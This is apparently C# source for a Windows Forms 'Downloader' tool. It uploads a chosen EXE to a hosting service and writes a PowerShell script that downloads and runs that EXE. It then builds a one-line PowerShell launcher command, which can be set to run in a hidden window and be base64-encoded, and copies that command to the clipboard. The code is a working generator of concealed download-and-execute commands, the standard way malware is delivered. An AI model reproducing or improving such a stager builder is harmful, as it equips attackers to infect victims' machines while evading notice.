using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Downloader
{
    public partial class MainForm : Form
    {
        private string currentExePath = "";
        private bool isHidden = false;
        private bool isEncrypted = false;
        private readonly UploadService uploadService = new UploadService();
        private readonly FileProcessor fileProcessor = new FileProcessor();

        public MainForm()
        {
            InitializeComponent();
        }

        private void BtnBrowse_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog openFileDialog = new OpenFileDialog())
            {
                openFileDialog.Filter = "EXE Files (*.exe)|*.exe";
                openFileDialog.Title = "Select EXE File";

                if (openFileDialog.ShowDialog() == DialogResult.OK)
                {
                    currentExePath = openFileDialog.FileName;
                    txtFilePath.Text = currentExePath;
                }
            }
        }

        private async void BtnGenerate_Click(object sender, EventArgs e)
        {
            if (string.IsNullOrEmpty(currentExePath))
            {
                MessageBox.Show("Please select an EXE file first!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }

            BtnGenerate.Enabled = false;

            try
            {
                string randomName = fileProcessor.GenerateRandomName();
                string tempFile = Path.Combine(Path.GetTempPath(), randomName);

                await Task.Run(() => File.Copy(currentExePath, tempFile, true));

                string payloadUrl = await uploadService.UploadFileAsync(tempFile);

                await Task.Run(() => File.Delete(tempFile));

                string[] urlParts = payloadUrl.Split('/');
                string filename = urlParts[urlParts.Length - 1];

                string psName = fileProcessor.GenerateRandomName();
                string psFile = Path.Combine(Path.GetTempPath(), psName);

                string psContent = fileProcessor.CreatePowerShellScript(payloadUrl, filename);
                await Task.Run(() => File.WriteAllText(psFile, psContent));

                string launcherUrl = await uploadService.UploadFileAsync(psFile);

                await Task.Run(() => File.Delete(psFile));

                string finalCommand = fileProcessor.GenerateFinalCommand(launcherUrl);

                if (isEncrypted)
                {
                    string innerCommand = "";
                    if (finalCommand.StartsWith("powershell \""))
                    {
                        int start = finalCommand.IndexOf('"') + 1;
                        int end = finalCommand.LastIndexOf('"');
                        if (start > 0 && end > start)
                        {
                            innerCommand = finalCommand.Substring(start, end - start);
                        }
                    }
                    else if (finalCommand.StartsWith("powershell"))
                    {
                        innerCommand = finalCommand.Substring(10).Trim();
                    }

                    byte[] bytes = Encoding.Unicode.GetBytes(innerCommand);
                    string encodedCommand = Convert.ToBase64String(bytes);

                    if (isHidden)
                    {
                        finalCommand = "powershell -WindowStyle Hidden -EncodedCommand " + encodedCommand;
                    }
                    else
                    {
                        finalCommand = "powershell -EncodedCommand " + encodedCommand;
                    }
                }
                else if (isHidden)
                {
                    if (finalCommand.StartsWith("powershell"))
                    {
                        finalCommand = finalCommand.Replace("powershell", "powershell -WindowStyle Hidden");
                    }
                }

                Clipboard.SetText(finalCommand);

                MessageBox.Show(
                    finalCommand,
                    "Command Generated",
                    MessageBoxButtons.OK,
                    MessageBoxIcon.Information);
            }
            catch (Exception ex)
            {
                MessageBox.Show("Error: " + ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            finally
            {
                BtnGenerate.Enabled = true;
            }
        }

        private void ChkHidden_CheckedChanged(object sender, EventArgs e)
        {
            isHidden = chkHidden.Checked;
        }

        private void ChkEncrypted_CheckedChanged(object sender, EventArgs e)
        {
            isEncrypted = chkEncrypted.Checked;
        }
    }
}